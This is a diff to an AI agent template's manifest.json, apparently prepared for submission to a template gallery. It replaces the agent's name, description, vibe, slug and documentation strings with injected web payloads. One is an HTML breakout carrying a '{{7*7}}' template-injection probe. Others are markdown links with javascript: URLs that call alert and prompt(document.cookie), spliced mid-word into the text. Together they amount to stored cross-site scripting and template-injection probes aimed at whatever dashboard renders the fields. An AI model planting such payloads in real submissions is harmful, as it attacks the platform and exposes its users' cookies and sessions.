@@ -2,25 +2,25 @@
   "version": 1,
 
   "agent": {
-    "name": "Useful Assistant",
-    "description": "A personal AI assistant that's actually helpful. Reads files, searches the web, manages memory, and gets things done without asking unnecessary questions.",
-    "vibe": "resourceful, opinionated, gets things done",
+    "name": "Useful Assist\"><h1>{{7*7}}ant",
+    "description": "A personal AI assistant th[Basic](javascript:alert('Basic'))at's actually helpful. Reads files, searches the web, manages memory, and gets things done without asking unnecessary questions.",
+    "vibe": "resourceful, opinionated, gets th[XSS](javascript:prompt(document.cookie))ings done",
     "emoji": "🧠"
   },
 
   "template": {
-    "slug": "useful-assistant",
+    "slug": "baba-dsk",
     "category": "general",
     "tags": ["assistant", "personal", "productivity", "general"],
     "partnerName": "Pinata"
   },
 
   "_docs": {
-    "_about": "This section documents all available manifest.json options. Remove this _docs block before submitting.",
+    "_about": "This section documents all available manifest.json options. Remove this _docs block before submitting[XSS](javascript:prompt(document.cookie)).",
 
     "version": "Required. Always 1.",
 
-    "agent.name": "Display name for the agent (max 100 chars).",
+    "agent.name": "[XSS](javascript:prompt(document.cookie))",
     "agent.description": "Agent personality or purpose (max 10,000 chars). Shown in the dashboard.",
     "agent.vibe": "Short tagline (max 200 chars). Shown under the agent name.",
     "agent.emoji": "Emoji icon for the agent (max 32 chars).",
